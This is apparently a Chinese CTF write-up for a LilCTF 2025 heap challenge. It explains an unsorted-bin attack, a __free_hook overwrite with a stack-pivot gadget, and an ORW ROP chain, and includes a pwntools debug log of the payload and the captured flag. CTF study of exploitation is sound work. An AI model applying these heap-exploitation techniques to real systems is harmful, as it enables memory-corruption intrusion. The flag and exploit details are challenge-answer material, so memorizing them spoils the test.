# debug
```
pwndbg> telescope 0x6cb0e0
00:0000│  0x6cb0e0 —▸ 0x7ffcfb60d59d ◂— 0x454d4f48006e7770 /* 'pwn' */
01:0008│  0x6cb0e8 —▸ 0x7ffcfb60d59b ◂— 0x4f48006e77702f2e /* './pwn' */
02:0010│  0x6cb0f0 ◂— 0
... ↓     3 skipped
06:0030│  0x6cb110 ◂— 1
07:0038│  0x6cb118 ◂— 0
```

## stdio
![](https://r2.20161023.xyz/pic/20250816120129520.png)

怎么找stdin，out，error
![](https://r2.20161023.xyz/pic/20250816120203643.png)

# seccomp
![](https://r2.20161023.xyz/pic/20250818133149081.png)

# 怎么找_free_hook
![](https://r2.20161023.xyz/pic/20250821182655085.png)


# info
```
0x400DAF            main fun_atoi
0x400BDE            add malloc
0x400BF8            add read_0x100
0x400CB9            edit read_0x100
0x41E985            call free_hook
```

# 知识点
unsorted_bin中移除chunk的代码流程如下：
```
bck = victim->bk;
unsorted_chunks(av)->bk = bck;
bck->fd = unsorted_chunks(av);
```
![](https://r2.20161023.xyz/pic/20250822200717395.png)


本解中，改写p_chunk的过程如下
```
edit(0, p64(0)+p64(p_chunk-0x10))
add(2, b"tinyfat")
```

```
victim =  0x00000000008fb890
bck = victim->bk = 0x00000000006ccd50

unc->bk = 0x6ccd50
bck->fd = 0x6ca858（*（0x6ccd50+0x10) = 0x6ca858）

即在此add后，p_chunk[0] = unsorted_chunks(av)

技巧： unsortedbin 链表最后一个chunk的bk设置成p_chunk-0x10, 再add后，p_chunk0=unsorted_chunks(av)，可以在任意地址写一个堆地址，本题中是静态地址。
```

![](https://r2.20161023.xyz/pic/20250822201218741.png)
![](https://r2.20161023.xyz/pic/20250822201715449.png)
以下这个图是后补的，heap的地址不一致，主要说明p_chunk0=0x6ca858
![](https://r2.20161023.xyz/pic/20250822202622410.png)

# magic gadget
栈迁移， free的是edi就是要释放的指针，如果把_free_hook改为这个，要释放的指针就可以变成rsp了，rsp上面构造orw+rop就可以读取flag了。妙啊，妙啊。
```
0x4b8fb8:    xchg   edi,eax
0x4b8fb9:    xchg   esp,eax
0x4b8fba:    ret
```
![](https://r2.20161023.xyz/pic/20250822203030674.png)

# 参考

https://gitee.com/Lil-Ran/LilCTF-2025/blob/main/players-writeup/X2cT34m/writeup.md#heap_pivoting

# getshell
```
    b'context: '
[DEBUG] Sent 0xb8 bytes:
    00000000  16 1a 40 00  00 00 00 00  78 cd 6c 00  00 00 00 00  │··@·│····│x·l·│····│
    00000010  37 1b 40 00  00 00 00 00  00 00 00 00  00 00 00 00  │7·@·│····│····│····│
    00000020  36 31 44 00  00 00 00 00  00 00 00 00  00 00 00 00  │61D·│····│····│····│
    00000030  84 fc 41 00  00 00 00 00  02 00 00 00  00 00 00 00  │··A·│····│····│····│
    00000040  e5 78 46 00  00 00 00 00  16 1a 40 00  00 00 00 00  │·xF·│····│··@·│····│
    00000050  03 00 00 00  00 00 00 00  37 1b 40 00  00 00 00 00  │····│····│7·@·│····│
    00000060  a0 bb 6c 00  00 00 00 00  36 31 44 00  00 00 00 00  │··l·│····│61D·│····│
    00000070  60 00 00 00  00 00 00 00  84 fc 41 00  00 00 00 00  │`···│····│··A·│····│
    00000080  00 00 00 00  00 00 00 00  e5 78 46 00  00 00 00 00  │····│····│·xF·│····│
    00000090  16 1a 40 00  00 00 00 00  01 00 00 00  00 00 00 00  │··@·│····│····│····│
    000000a0  84 fc 41 00  00 00 00 00  01 00 00 00  00 00 00 00  │··A·│····│····│····│
    000000b0  e5 78 46 00  00 00 00 00                            │·xF·│····│
    000000b8
[DEBUG] Received 0x2a bytes:
    b'1.add\n'
    b'2.delete\n'
    b'3.edit\n'
    b'4.exit\n'
    b'Your choice:\n'
[DEBUG] Sent 0x2 bytes:
    b'2\n'
[DEBUG] Received 0x4 bytes:
    b'idx:'
[DEBUG] Sent 0x2 bytes:
    b'2\n'
[*] Switching to interactive mode
[DEBUG] Received 0x60 bytes:
    00000000  4c 49 4c 43  54 46 7b 35  37 31 33 66  63 35 65 2d  │LILC│TF{5│713f│c5e-│
    00000010  66 32 62 30  2d 34 64 61  63 2d 62 32  32 64 2d 39  │f2b0│-4da│c-b2│2d-9│
    00000020  62 37 64 65  33 65 63 61  38 36 38 7d  00 00 00 00  │b7de│3eca│868}│····│
    00000030  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│
    00000040  00 00 00 00  00 00 00 00  60 b2 6c 00  00 00 00 00  │····│····│`·l·│····│
    00000050  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│
    00000060
LILCTF{5713fc5e-f2b0-4dac-b22d-9b7de3eca868}\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00`\xb2l\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00$                                                                                                                  [*] Got EOF while reading in interactive
$
```
![](https://r2.20161023.xyz/pic/20250822155423926.png)